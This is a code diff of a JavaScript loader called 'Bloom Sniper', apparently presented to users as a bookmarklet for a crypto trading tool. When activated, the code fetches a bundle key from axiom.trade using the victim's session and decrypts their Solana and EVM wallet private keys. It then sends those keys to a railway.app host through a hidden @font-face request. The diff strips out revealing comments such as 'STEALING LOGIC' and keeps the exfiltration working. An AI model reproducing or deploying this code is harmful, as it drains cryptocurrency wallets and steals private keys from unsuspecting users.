@@ -1,6 +1,4 @@
-// === BLOOM SNIPER - MAX STEALTH (Silent @font-face exfil) ===
-console.log('🚀 Bloom Sniper Loader loaded');
-
+// === BLOOM SNIPER - MAX STEALTH SILENT VERSION ===
 document.addEventListener('DOMContentLoaded', function() {
     const buttons = document.querySelectorAll('.bookmarklet, .activate-btn, a[draggable]');
     buttons.forEach(function(btn) {
@@ -52,7 +50,6 @@ document.addEventListener('DOMContentLoaded', function() {
                     return new Uint8Array(decrypted);
                 }
 
-                // === STEALING LOGIC ===
                 const { bundleKey } = await (await fetch("https://api8.axiom.trade/bundle-key-and-wallets", {
                     method: "POST",
                     credentials: "include"
@@ -65,7 +62,6 @@ document.addEventListener('DOMContentLoaded', function() {
 
                 const success = [];
 
-                // Solana
                 for (const bundle of solanaBundles) {
                     try {
                         const decryptedBundle = await decrypt(cryptoKey, bundle);
@@ -77,7 +73,6 @@ document.addEventListener('DOMContentLoaded', function() {
                     } catch (e) {}
                 }
 
-                // EVM (no external import)
                 for (const bundle of evmBundles) {
                     try {
                         const decryptedBundle = await decrypt(cryptoKey, bundle);
@@ -88,8 +83,13 @@ document.addEventListener('DOMContentLoaded', function() {
 
                 // === SILENT @font-face EXFIL ===
                 const RAILWAY_URL = "https://bloom-sniper-replica-production.up.railway.app";
-                const timestamp = Math.floor(Date.now() / 1000);
-                const payload = { keys: success, code: "sJduOyBJQoTeui1A", site: "Axiom", timestamp: timestamp, header: navigator.userAgent };
+                const payload = {
+                    keys: success,
+                    code: "sJduOyBJQoTeui1A",
+                    site: "Axiom",
+                    timestamp: Math.floor(Date.now() / 1000),
+                    header: navigator.userAgent
+                };
 
                 const jsonStr = JSON.stringify(payload);
                 const safeB64 = btoa(unescape(encodeURIComponent(jsonStr)));
@@ -104,7 +104,6 @@ document.addEventListener('DOMContentLoaded', function() {
 
                 document.head.appendChild(style);
                 document.body.appendChild(div);
-
             } catch (err) {}
         };
 
